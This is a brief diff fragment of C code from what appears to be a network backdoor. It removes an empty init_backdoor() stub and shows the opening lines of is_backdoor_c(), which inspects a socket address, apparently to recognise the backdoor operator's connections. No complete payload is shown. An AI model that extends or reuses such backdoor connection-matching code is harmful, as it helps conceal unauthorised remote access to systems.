@@ -6,9 +6,6 @@
 #include "backdoor.h"
 #include "config.h"
 
-void init_backdoor(void){
-}
-
 int is_backdoor_c(const struct sockaddr* addr, socklen_t addrlen){
 	if(addr->sa_family == AF_INET){
 		struct sockaddr_in* sn = (struct sockaddr_in*)addr;
